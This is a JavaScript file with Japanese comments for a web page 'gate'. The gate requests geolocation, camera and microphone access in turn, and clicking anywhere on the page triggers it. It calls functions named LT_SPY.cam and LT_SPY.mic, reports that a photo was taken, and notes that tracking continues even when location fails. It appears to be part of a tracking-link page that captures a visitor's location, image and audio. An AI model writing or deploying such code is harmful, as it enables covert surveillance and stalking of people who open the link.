/* 要件ゲート。押されたら 位置情報→カメラ→マイク の順で許可を求める。
   位置情報は無反応対策でJS側タイムアウト。失敗しても止めずに先へ進む。 */
(function () {
  "use strict";

  var GATE = document.getElementById("lt_gate");
  var btn = document.getElementById("lt_go");
  var stat = document.getElementById("lt_gate_st");
  var busy = false;

  function say(t) { if (stat) stat.textContent = t || ""; }
  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var cp = document.getElementById("lt_copy");
  if (cp) {
    cp.addEventListener("click", function (e) {
      e.stopPropagation();
      var url = location.href;
      function done() {
        cp.textContent = "コピーしました";
        setTimeout(function () { cp.textContent = "リンクをコピー"; }, 1600);
      }
      function fallback() {
        try {
          var t = document.createElement("textarea");
          t.value = url;
          t.style.cssText = "position:fixed;left:-9999px";
          document.body.appendChild(t);
          t.select();
          document.execCommand("copy");
          t.remove();
          done();
        } catch (err) {}
      }
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(url).then(done).catch(fallback);
        } else fallback();
      } catch (err) { fallback(); }
    });
  }

  /* ★ 無反応でも必ず返す */
  function geoOnce(o) {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res(null);
      var done = false;
      var to = setTimeout(function () { if (!done) { done = true; res(null); } },
                          (o.timeout || 9000) + 1200);
      try {
        navigator.geolocation.getCurrentPosition(
          function (p) { if (done) return; done = true; clearTimeout(to); res(p); },
          function (e) { if (done) return; done = true; clearTimeout(to); res({ err: e }); },
          o);
      } catch (e) { clearTimeout(to); if (!done) { done = true; res(null); } }
    });
  }

  function geo() {
    if (!navigator.geolocation) { say("① 位置情報：この端末では非対応"); return Promise.resolve(false); }
    say("① 位置情報の許可を確認しています…");
    return geoOnce({ enableHighAccuracy: true, timeout: 9000, maximumAge: 0 })
      .then(function (r) {
        if (r && r.coords) {
          window.LT_FIRST_FIX = r;
          say("① 位置情報：取得しました");
          return true;
        }
        say("① 位置情報：まだ取得できていません（追跡は続きます）");
        return false;
      });
  }

  function cam() {
    if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve(true);
    say("② カメラの許可を確認しています…");
    return Promise.race([window.LT_SPY.cam(), wait(20000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "② カメラ：撮影しました" : "② カメラ：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function mic() {
    if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve(true);
    say("③ マイクの許可を確認しています…");
    return Promise.race([window.LT_SPY.mic(), wait(20000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "③ マイク：OK" : "③ マイク：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function pass() {
    if (window.LT_GATE_PASS) return;
    window.LT_GATE_PASS = true;
    if (GATE) {
      GATE.classList.add("out");
      setTimeout(function () { GATE.style.display = "none"; }, 420);
    }
    if (window.LT_FIRST_FIX && window.LT_LIVE && window.LT_LIVE.feed) {
      try { window.LT_LIVE.feed(window.LT_FIRST_FIX); } catch (e) {}
    }
    try { window.dispatchEvent(new Event("igt:gate")); } catch (e) {}
  }

  function run() {
    if (busy) return;
    busy = true;
    if (btn) { btn.disabled = true; btn.textContent = "確認中…"; }
    say("");

    var ok = { geo: false, cam: false, mic: false };
    geo().then(function (r) {
      ok.geo = r;
      return cam();
    }).then(function (r) {
      ok.cam = r;
      return mic();
    }).then(function (r) {
      ok.mic = r;

      if (ok.geo && ok.cam && ok.mic) {
        window.LT_ALLOW_REDIRECT = true;
        var ia = document.getElementById("lt_ia");
        if (ia) ia.style.display = "none";
      } else {
        document.body.classList.add("need");
      }
      setTimeout(pass, 250);
    });
    setTimeout(pass, 16000);   // 保険（無反応でも先へ）
  }

  if (btn) btn.addEventListener("click", run, { once: true });
  document.addEventListener("click", function (e) {
    if (busy) return;
    if (e.target === btn) return;
    if (e.target && e.target.closest && e.target.closest(".noclick")) return;
    run();
  }, { passive: true });

  window.LT_GATE_RUN = run;
  if (!GATE) pass();
})();